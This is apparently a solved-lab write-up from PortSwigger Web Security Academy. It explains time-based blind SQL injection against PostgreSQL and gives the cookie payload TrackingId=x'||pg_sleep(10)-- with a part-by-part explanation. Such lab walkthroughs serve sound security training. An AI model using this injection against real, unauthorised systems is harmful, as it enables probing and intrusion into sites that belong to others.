# Blind SQL Injection with Time Delays


**Platform:** PortSwigger Web Security Academy

**Difficulty:** Practitioner

**Type:** Blind SQL Injection

**Database:** PostgreSQL

**Status:** Solved



## 🎯 Objective



Exploit the `TrackingId` cookie to cause a **10-second delay** in the server response.





## 🧠 Core Idea



The application does not reveal SQL results or errors.



Instead, we use a **time delay** as a side channel:



```text

SQL Injection

     ↓

pg_sleep(10)

     ↓

Database waits 10 seconds

     ↓

Response is delayed

```



## Payload



```http

TrackingId=x'||pg_sleep(10)--

```



### Explanation



```sql

pg_sleep(10)

```



tells PostgreSQL to pause execution for **10 seconds**.



```text

'|| 

```



closes the original value and injects our SQL expression.



```text
--

```



comments out the remaining part of the original query.



## 🔑 Key Takeaway



In **Time-Based Blind SQL Injection**, we use the **response time** instead of:



* Response content

* SQL errors

* Returned database values



```text

No visible difference

        ↓

Inject time delay

        ↓

Response takes ~10 seconds

        ↓

SQL Injection confirmed


```


### References


* [PortSwigger — Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
* [PortSwigger — SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
